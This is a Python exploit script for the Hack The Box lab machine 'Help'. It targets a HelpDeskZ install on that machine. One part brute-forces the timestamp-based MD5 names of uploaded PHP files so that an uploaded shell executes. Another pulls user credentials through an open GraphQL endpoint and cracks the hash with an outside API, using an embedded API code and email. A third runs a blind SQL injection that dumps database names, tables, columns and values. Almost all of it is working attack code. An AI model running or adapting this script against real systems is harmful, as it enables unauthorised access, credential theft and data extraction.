#!/usr/bin/env python3

"""
Help HTB
--------
Author: Marss
Date: 28 Jul, 2023
"""

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from datetime import datetime
from hashlib import md5
from json import loads
from pwn import *
from re import findall
from requests import Session, Request, get
from requests.exceptions import ConnectionError
from signal import signal, SIGINT
from string import ascii_lowercase, ascii_letters, digits, punctuation
from sys import argv

# debugging
import pdb

# Ctrl + C
# (function)
def signal_handler(signum, frame):
    exit('\n[!] User abort.')

# (signal)
signal(SIGINT, signal_handler)

# Main class
class Exploit:

    def __init__(self, args):
        
        self.args = args
        self.target = {
            'ip':'10.10.10.121',
            'domain':'help.htb',
            'credentials': {
                'helpdesk_user': None,
                'helpdesk_pass': None,
            },
            'csrfhash': None,
            'ticket_url': None,
            'pattern_one': ascii_lowercase + '_',
            'pattern_two': ascii_letters + digits + punctuation
        }
        self.session = Session()

        # proxies
        #self.proxies = {'http':'127.1:8080'}
        #self.session.proxies.update(self.proxies)

    def run(self):

        try:
            if self.verify_connection():
                if self.args.file:
                    # Arbitrary file upload
                    current_time = self.get_server_time()
                    self.execute_file_uploaded(current_time)
                if self.args.dump:
                    # Blind SQLi
                    self.save_helpdesk_credentials()
                    self.save_csrf_hash()
                    self.dump_database()

        except Exception as error:
            exit('\n[!] Error: ' + repr(error))

    def verify_connection(self) -> bool:

        try:
            response = get('http://' + self.target['ip'])
            if response.status_code == 200:
                print('\n[*] Target is up!')
                return True
        except ConnectionError:
            exit(f"\n[!] Verify connection with the target or resolve '{self.target['domain']}' on your local DNS server (/etc/hosts).")

    def get_server_time(self) -> int:

        response = get('http://' + self.target['domain'])
        
        date_format = '%a, %d %b %Y %H:%M:%S %Z' # Sat, 29 Jul 2023 04:14:39 GMT
        current_date = datetime.strptime(response.headers['Date'], date_format)
        init_date = datetime(1970, 1, 1)
        date_diff_seconds = (current_date - init_date).total_seconds()
        
        return int(date_diff_seconds)

    def execute_file_uploaded(self, current_time: int):

        p = log.progress('Searching uploaded file')
        # estimated time: 5 minutes = 300 seconds
        seconds = 0
        file_found = False
        
        while not file_found and seconds <= 300:
            file_name_by_time = self.args.file + str(current_time - seconds)
            md5_hash = md5(file_name_by_time.encode('utf-8')).hexdigest()
            
            file_path = 'http://' + self.target['domain'] + '/support/uploads/tickets/' + md5_hash + '.php'
            p.status(file_path)
            response = get(file_path)
            if response.status_code == 200:
                file_found = True
                exit(f'\n[+] File executed! -> {file_path}')
            
            seconds += 1

        print('\n[-] File not found.')

    def save_helpdesk_credentials(self):
        
        graphql_query = 'http://' + self.target['domain'] + ':3000' + '/graphql?query={user{username,password}}'
        response = get(graphql_query)

        self.target['credentials']['helpdesk_user'] = loads(response.text)['data']['user']['username']
        md5_hash = loads(response.text)['data']['user']['password'] # godhelpmeplz
        self.target['credentials']['helpdesk_pass'] = self.md5_reverse_API(md5_hash)

    def md5_reverse_API(self, _hash) -> str:
        
        # https://md5decrypt.net/en/Api/
        hash_type = 'md5'
        temp_email = 'desano6793@wiemei.com'
        code = 'b637cf7ff9580e2d'
        
        url = f'https://md5decrypt.net/en/Api/api.php?hash={_hash}&hash_type={hash_type}&email={temp_email}&code={code}'
        response = get(url)
        if response.status_code == 200:
            return response.text
        else:
            exit('\n[!] Error: Maybe you need to a new code with a temporal email')

    def save_csrf_hash(self):

        req = Request('GET', 'http://' + self.target['domain'] + '/support')
        prepare_req = self.session.prepare_request(req)
        response = self.session.send(prepare_req)

        self.target['csrfhash'] = findall(r'name="csrfhash" value="(.*?)"', response.text)[0]
    
    def helpdesk_login(self):

        post_data = {
            'do': 'login',
            'csrfhash': self.target['csrfhash'],
            'email': self.target['credentials']['helpdesk_user'],
            'password': self.target['credentials']['helpdesk_pass'],
            'btn': 'Login'
        }
        
        req = Request('POST', 'http://' + self.target['domain'] + '/support/?v=login', 
            data=post_data
        )
        prepare_req = self.session.prepare_request(req)
        self.session.send(prepare_req)

    def get_ticket_id(self) -> str:
        
        try:
            req = Request('GET', 'http://' + self.target['domain'] + '/support/?v=view_tickets')
            prepare_req = self.session.prepare_request(req)
            response = self.session.send(prepare_req)
            
            ticket_id = findall(r'param\[\]=(\d{1,2})', response.text)[0]
            self.save_ticket_url(ticket_id)

            return ticket_id
        except Exception as error:
            print('\n[-] No tickets found.')
            exit('\n[!] Please manually add a new ticket with an attachment in helpdeskz.')

    def save_ticket_url(self, ticket_id):

        req = Request('GET', 'http://' + self.target['domain'] + f'/support/?v=view_tickets&action=ticket&param[]={ticket_id}')
        prepare_req = self.session.prepare_request(req)
        response = self.session.send(prepare_req)

        self.target['ticket_url'] = re.findall(r'param\[\]=\d{1,2}(.*?)"', response.text)[1].replace('&amp;','&')

    def dump_database(self):
        
        self.helpdesk_login()
        ticket_id = self.get_ticket_id()

        if self.args.database and self.args.table and self.args.column:
            # dump value of specific column, table and db
            p = log.progress('Value')
            
            sql_query = 'and convert((select if(SUBSTRING((select ' + self.args.column + ' from ' + self.args.database + '.' + self.args.table + ' group by ' + self.args.column + ' ASC limit {},1),1,{})="{}",1,"")),char)'
            self.print_dump_data(ticket_id, sql_query, p, characters=self.target['pattern_two'])

        elif self.args.database and self.args.table:
            # dump columns of specific table and db
            p = log.progress('Columns')

            sql_query = 'and convert((select if(SUBSTRING((select group_concat(column_name) from information_schema.columns where table_name="' + self.args.table + '" and table_schema="' + self.args.database + '" group by column_name ASC limit {},1),1,{})="{}",1,"")),char)'
            self.print_dump_data(ticket_id, sql_query, p, characters=self.target['pattern_one'])
    
        elif self.args.database:
            # dump tables of specific db
            p = log.progress('Tables')

            sql_query = 'and convert((select if(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema="' + self.args.database + '" group by table_name ASC limit {},1),1,{})="{}",1,"")),char)'
            self.print_dump_data(ticket_id, sql_query, p, characters=self.target['pattern_one'])

        elif self.args.dump:
            # dump databases
            p = log.progress('Databases')

            sql_query = 'and convert((select if(SUBSTRING((select group_concat(schema_name) from information_schema.schemata group by schema_name ASC limit {},1),1,{})="{}",1,"")),char)'
            self.print_dump_data(ticket_id, sql_query, p, characters=self.target['pattern_one'])

    def dump(self, ticket_id, sql_query, data_pos, p, characters, name_pos=1, name=''):
        
        if self.send_injection(sql_query.format(data_pos, name_pos, name + ' '), ticket_id):
            return name

        for letter in characters:
            p.status(name + letter)
            if self.send_injection(sql_query.format(data_pos, name_pos, name + letter), ticket_id):
                name += letter
                name_pos += 1
                
                return self.dump(ticket_id, sql_query, data_pos, p, characters, name_pos, name)

    def send_injection(self, query, ticket_id) -> bool:

        target_url = 'http://' + self.target['domain'] + f'/support/?v=view_tickets&action=ticket&param[]={ticket_id}{self.target["ticket_url"]} ' + query
        req = Request('GET', target_url)
        prepare_req = self.session.prepare_request(req)
        
        response = self.session.send(prepare_req, proxies=self.proxies)
        if 'Page not found' in response.text:
            return False
        else:
            return True

    def print_dump_data(self, ticket_id, query, p, characters):
        
        data_pos = 0
        while True:
            name = self.dump(ticket_id, query, data_pos, p, characters)
            if name == None:
                break
            print('\n|' + name + '|', end='')
            data_pos += 1

# Main flow
if __name__ == '__main__':

    banner = '| Help HTB |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example: 
        python3 {argv[0]} --file shell.php
        python3 {argv[0]} --dump -d support -t staff -c password'''
    )

    parser.add_argument('-f', '--file', type=str, help='Run uploaded file')
    parser.add_argument('--dump', action='store_true', help='Dump database')
    parser.add_argument('-d', '--database', type=str, help='Show database tables')
    parser.add_argument('-t', '--table', type=str, help='Show table columns')
    parser.add_argument('-c', '--column', type=str, help='Show column values')

    args = parser.parse_args()

    print(banner)

    exploit = Exploit(args)
    exploit.run()